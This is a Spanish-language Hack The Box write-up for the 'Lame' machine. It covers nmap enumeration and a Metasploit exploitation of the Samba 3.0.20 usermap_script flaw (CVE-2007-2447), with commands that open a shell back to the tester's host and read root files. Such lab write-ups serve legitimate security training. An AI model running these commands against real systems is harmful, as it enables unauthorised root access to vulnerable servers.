## 🖥️ Lame — HackTheBox Writeup

---

### 📋 Información de la máquina

| Campo | Detalle |
| --- | --- |
| **Nombre** | Lame |
| **OS** | Linux |
| **Dificultad** | Easy |
| **Plataforma** | Hack The Box |
| **Técnicas** | CVE-2007-2447 Samba RCE |

---

### 🔍 1. Enumeración — Nmap

bash

`nmap -sCV -p- --open -n -Pn -vvv -T5 10.129.20.228 -oN fullscan`

| Puerto | Servicio | Versión |
| --- | --- | --- |
| 21 | FTP | vsftpd 2.3.4 |
| 22 | SSH | OpenSSH 4.7p1 |
| 139 | SMB | Samba 3.0.20 |
| 445 | SMB | Samba 3.0.20 |

---

### 💥 2. Explotación — CVE-2007-2447 Samba

Samba 3.0.20 es vulnerable a inyección de metacaracteres en el campo username a través de la función `SamrChangePassword` cuando la opción `username map script` está habilitada en `smb.conf`.

### Con Metasploit

bash

`msfconsole -q
search CVE-2007-2447
use exploit/multi/samba/usermap_script
set RHOSTS 10.129.20.228
set LHOST TU_IP_TUN0
run`

Shell obtenida directamente como **root** — sin necesidad de escalada de privilegios.

---

### 🏆 3. Flags

bash

`# User flag
cat /home/makis/user.txt

# Root flag
cat /root/root.txt`

---

### 📚 Lecciones aprendidas

- Samba 3.0.20 con `username map script` habilitado es directamente explotable como root
- CVE-2007-2447 de 2007 sigue siendo relevante para entender RCE en servicios de red
- vsftpd 2.3.4 también tiene un CVE conocido (backdoor) pero no fue necesario usarlo
- Siempre enumerar versiones exactas de servicios — la versión lo es todo

---

### 🛠️ Herramientas

| Herramienta | Uso |
| --- | --- |
| Nmap | Enumeración |
| Metasploit | Explotación CVE-2007-2447 |
